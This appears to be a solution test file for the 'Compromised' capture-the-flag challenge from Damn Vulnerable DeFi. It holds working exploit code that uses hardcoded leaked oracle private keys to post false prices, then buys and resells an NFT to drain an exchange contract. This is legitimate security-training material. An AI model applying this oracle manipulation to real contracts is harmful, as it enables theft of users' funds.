const { expect } = require('chai'); 
const { ethers } = require('hardhat');
const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
const { Wallet } = require('ethers');

describe('Compromised challenge', function () {
    let deployer, player;
    let oracle, exchange, nftToken;

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    const EXCHANGE_INITIAL_ETH_BALANCE = 999n * 10n ** 18n;
    const INITIAL_NFT_PRICE = 999n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
    const TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();
        
        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            setBalance(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
            expect(await ethers.provider.getBalance(sources[i])).to.equal(TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        
        // Player starts with limited balance
        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
        
        // Deploy the oracle and setup the trusted sources with initial prices
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);
        oracle = await (await ethers.getContractFactory('TrustfulOracle', deployer)).attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ['DVNFT', 'DVNFT', 'DVNFT'],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = await (await ethers.getContractFactory('Exchange', deployer)).deploy(
            oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        nftToken = await (await ethers.getContractFactory('DamnValuableNFT', deployer)).attach(await exchange.token());
        expect(await nftToken.owner()).to.eq(ethers.constants.AddressZero); // ownership renounced
        expect(await nftToken.rolesOf(exchange.address)).to.eq(await nftToken.MINTER_ROLE());
    });

    it('Execution', async function () {
        /* to get this PKs you need to convert HEX messages from the snippet to string and then to Base64*/
        const privateKey1 = '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9';
        const privateKey2 = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';
        let wallet1 = new ethers.Wallet(privateKey1,ethers.provider);
        let wallet2 = new ethers.Wallet(privateKey2,ethers.provider);

        /*console.log("!!!!!!!!!!!!!!!!!!!!!!!!!");
        console.log("BUY");*/

        await oracle.connect(wallet1).postPrice('DVNFT',0);
        await oracle.connect(wallet2).postPrice('DVNFT',0);
        
        const nftID = await exchange.connect(player).callStatic.buyOne({value: PLAYER_INITIAL_ETH_BALANCE/3n});
        await exchange.connect(player).buyOne({value: PLAYER_INITIAL_ETH_BALANCE/3n});
        
        /*console.log("player->",await player.address);
        console.log("nftID->", nftID);
        console.log("owner->",await nftToken.ownerOf(nftID));
        console.log("balance player->",await ethers.provider.getBalance(player.address));
        console.log("balance exchange->",await ethers.provider.getBalance(exchange.address));

        console.log("1->",await oracle.getPriceBySource('DVNFT',sources[0]));
        console.log("2->",await oracle.getPriceBySource('DVNFT',sources[1]));
        console.log("3->",await oracle.getPriceBySource('DVNFT',sources[2]));
        console.log("price->",await oracle.getMedianPrice('DVNFT'));

        console.log("!!!!!!!!!!!!!!!!!!!!!!!!!");
        console.log("SELL");*/

        await oracle.connect(wallet1).postPrice('DVNFT',INITIAL_NFT_PRICE);
        await oracle.connect(wallet2).postPrice('DVNFT',INITIAL_NFT_PRICE);

        await nftToken.connect(player).approve(exchange.address,nftID);
        await exchange.connect(player).sellOne(nftID);

        /*console.log("owner->",await nftToken.ownerOf(nftID));
        console.log("balance player->",await ethers.provider.getBalance(player.address));
        console.log("balance exchange->",await ethers.provider.getBalance(exchange.address));

        console.log("1->",await oracle.getPriceBySource('DVNFT',sources[0]));
        console.log("2->",await oracle.getPriceBySource('DVNFT',sources[1]));
        console.log("3->",await oracle.getPriceBySource('DVNFT',sources[2]));
        console.log("price->",await oracle.getMedianPrice('DVNFT'));*/
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(exchange.address)
        ).to.be.eq(0);
        
        // Player's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(player.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Player must not own any NFT
        expect(
            await nftToken.balanceOf(player.address)
        ).to.be.eq(0);

        // NFT price shouldn't have changed
        expect(
            await oracle.getMedianPrice('DVNFT')
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
